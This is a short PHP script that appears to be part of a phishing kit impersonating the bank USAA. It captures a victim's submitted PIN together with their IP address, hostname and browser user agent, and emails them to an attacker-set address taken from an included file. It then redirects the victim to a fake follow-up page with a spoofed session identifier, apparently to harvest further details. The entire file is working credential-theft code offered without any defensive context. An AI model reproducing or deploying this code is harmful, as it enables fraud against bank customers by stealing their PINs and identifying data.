<?php
if($_POST["pin0978"] != "" ){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------USAA 9in-----------------------\n";
$message .= "|9in : ".$_POST['pin0978']."\n";
 
$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'fillin.php';
$subject = "Result from USAA| ".$ip."\n";
 
{
mail("$to", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
header('Location: qanda.php?cmd=login_submit&id=$praga$praga&session=$praga$praga');
}else{
header ("Location: index.php");
}

?>


   